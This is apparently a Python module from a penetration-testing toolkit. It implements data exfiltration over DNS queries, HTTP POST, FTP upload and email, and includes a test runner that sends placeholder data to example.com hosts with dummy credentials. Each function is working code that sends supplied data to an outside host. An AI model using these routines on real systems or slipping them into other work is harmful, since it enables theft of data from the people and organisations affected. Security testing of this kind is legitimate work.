"""
modules/pentesting_tools/data_exfiltration_tools.py

Tools for simulating and testing data exfiltration methods in controlled environments to evaluate security measures.
"""

import os
import socket
import base64
from typing import Optional


class DataExfiltrationTools:
    """
    A class to simulate various data exfiltration techniques for penetration testing.
    """

    @staticmethod
    def exfiltrate_via_dns(data: str, dns_server: str) -> bool:
        """
        Simulates data exfiltration via DNS queries.
        :param data: Data to exfiltrate.
        :param dns_server: Target DNS server.
        :return: True if successful, False otherwise.
        """
        print("Starting DNS exfiltration...")
        try:
            encoded_data = base64.urlsafe_b64encode(data.encode()).decode()
            query = f"{encoded_data}.example.com"
            result = socket.gethostbyname(query)
            print(f"DNS query sent: {query}, Response: {result}")
            return True
        except Exception as e:
            print(f"Error during DNS exfiltration: {e}")
            return False

    @staticmethod
    def exfiltrate_via_http(data: str, url: str) -> bool:
        """
        Simulates data exfiltration via HTTP POST requests.
        :param data: Data to exfiltrate.
        :param url: Target URL for exfiltration.
        :return: True if successful, False otherwise.
        """
        print(f"Starting HTTP exfiltration to {url}...")
        try:
            import requests
            response = requests.post(url, data={"exfil_data": data})
            print(f"HTTP POST Response Code: {response.status_code}")
            return response.status_code == 200
        except Exception as e:
            print(f"Error during HTTP exfiltration: {e}")
            return False

    @staticmethod
    def exfiltrate_via_ftp(data: str, ftp_server: str, username: str, password: str, file_name: str = "exfil_data.txt") -> bool:
        """
        Simulates data exfiltration via FTP by uploading a file containing the data.
        :param data: Data to exfiltrate.
        :param ftp_server: Target FTP server.
        :param username: FTP username.
        :param password: FTP password.
        :param file_name: Name of the file to upload.
        :return: True if successful, False otherwise.
        """
        print(f"Starting FTP exfiltration to {ftp_server}...")
        try:
            from ftplib import FTP
            ftp = FTP(ftp_server)
            ftp.login(user=username, passwd=password)
            with open(file_name, 'w') as f:
                f.write(data)
            with open(file_name, 'rb') as f:
                ftp.storbinary(f"STOR {file_name}", f)
            ftp.quit()
            os.remove(file_name)
            print(f"Data successfully exfiltrated via FTP to {ftp_server}.")
            return True
        except Exception as e:
            print(f"Error during FTP exfiltration: {e}")
            return False

    @staticmethod
    def exfiltrate_via_email(data: str, recipient_email: str, smtp_server: str, sender_email: str, sender_password: str) -> bool:
        """
        Simulates data exfiltration via email by sending the data as an attachment.
        :param data: Data to exfiltrate.
        :param recipient_email: Target email address.
        :param smtp_server: SMTP server for sending email.
        :param sender_email: Sender's email address.
        :param sender_password: Sender's email password.
        :return: True if successful, False otherwise.
        """
        print(f"Starting email exfiltration to {recipient_email} via {smtp_server}...")
        try:
            import smtplib
            from email.message import EmailMessage
            msg = EmailMessage()
            msg.set_content("Data exfiltration test")
            msg["Subject"] = "Exfil Data"
            msg["From"] = sender_email
            msg["To"] = recipient_email
            msg.add_attachment(data.encode(), maintype="text", subtype="plain", filename="exfil_data.txt")
            with smtplib.SMTP_SSL(smtp_server) as server:
                server.login(sender_email, sender_password)
                server.send_message(msg)
            print("Data successfully exfiltrated via email.")
            return True
        except Exception as e:
            print(f"Error during email exfiltration: {e}")
            return False


class DataExfiltrationTester:
    """
    A class to test data exfiltration methods.
    """

    @staticmethod
    def run_tests():
        """
        Runs tests for all data exfiltration methods.
        """
        print("Running data exfiltration tests...")
        test_data = "Sensitive test data for exfiltration."
        dns_server = "8.8.8.8"  # Example DNS server
        http_url = "http://example.com/exfil"  # Example HTTP URL
        ftp_server = "ftp.example.com"  # Example FTP server
        email_recipient = "recipient@example.com"
        email_sender = "sender@example.com"
        smtp_server = "smtp.example.com"
        email_password = "password123"

        # DNS Exfiltration
        DataExfiltrationTools.exfiltrate_via_dns(test_data, dns_server)

        # HTTP Exfiltration
        DataExfiltrationTools.exfiltrate_via_http(test_data, http_url)

        # FTP Exfiltration
        DataExfiltrationTools.exfiltrate_via_ftp(test_data, ftp_server, "user", "pass")

        # Email Exfiltration
        DataExfiltrationTools.exfiltrate_via_email(
            test_data,
            email_recipient,
            smtp_server,
            email_sender,
            email_password,
        )


if __name__ == "__main__":
    # Run exfiltration tests
    DataExfiltrationTester.run_tests()
